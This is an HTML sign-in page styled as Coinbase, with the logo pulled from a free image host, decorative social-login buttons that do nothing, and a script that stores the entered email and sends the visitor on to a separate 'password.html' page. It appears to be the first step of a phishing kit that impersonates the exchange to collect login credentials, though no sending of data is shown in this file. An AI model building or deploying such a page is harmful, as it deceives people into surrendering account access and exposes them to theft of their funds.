<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In</title>

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
background:#0a0b0d;
font-family:Arial,sans-serif;
color:white;
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding:20px
}
.login-container{
width:100%;
max-width:400px;
padding:40px 20px
}
.header{
display:flex;
justify-content:space-between;
align-items:center;
margin-bottom:20px
}
.logo{
width:40px;
height:auto;
}
.signup-text{color:#578bfa;font-weight:500}
.welcome-text{
font-size:32px;
font-weight:bold;
margin-bottom:30px
}
.input-group{margin-bottom:20px}
.input-label{
color:#b0b3b8;
margin-bottom:8px;
display:block
}
.input-field{
width:100%;
padding:12px 16px;
background:#2a2d35;
border:2px solid #3a3d45;
border-radius:8px;
color:white
}
.next-button{
width:100%;
padding:12px;
border:none;
border-radius:25px;
font-weight:bold;
background:#304c84;
cursor:pointer;
margin-bottom:30px
}
.next-button.valid{background:#578bfa}
.divider{
display:flex;
align-items:center;
margin:30px 0;
color:#6b7280
}
.divider::before,.divider::after{
content:'';
flex:1;
height:1px;
background:#3a3d45
}
.divider::before{margin-right:16px}
.divider::after{margin-left:16px}
.social-buttons{display:flex;flex-direction:column;gap:12px}
.social-button{
width:100%;
padding:12px;
background:#32353d;
border:none;
border-radius:25px;
color:white;
font-weight:500;
cursor:default
}
</style>
</head>

<body>

<div class="login-container">

<div class="header">
<img src="https://i.ibb.co/hxLZBrrz/Coinbase-Logo-PNG-File.png" class="logo" alt="Coinbase">
<div class="signup-text">Sign Up</div>
</div>

<h1 class="welcome-text">Sign In</h1>

<form id="loginForm">
<div class="input-group">
<label class="input-label">Email</label>
<input type="text" id="emailPhone" class="input-field" placeholder="Your email address" required>
</div>
<button type="submit" class="next-button">Continue</button>
</form>

<div class="divider">OR</div>

<div class="social-buttons">
<button class="social-button">Sign in with Passkey</button>
<button class="social-button">Sign in with Google</button>
<button class="social-button">Sign in with Apple</button>
<button class="social-button">Sign in with Wallet</button>
</div>

</div>

<script>
const emailInput=document.getElementById("emailPhone");
const btn=document.querySelector(".next-button");

emailInput.addEventListener("input",()=>{
btn.classList.toggle("valid",emailInput.value.trim());
});

document.getElementById("loginForm").addEventListener("submit",function(e){
e.preventDefault();
const email=emailInput.value.trim();
if(!email) return;
sessionStorage.setItem("userEmail",email);
window.location.href="password.html";
});
</script>

</body>
</html>
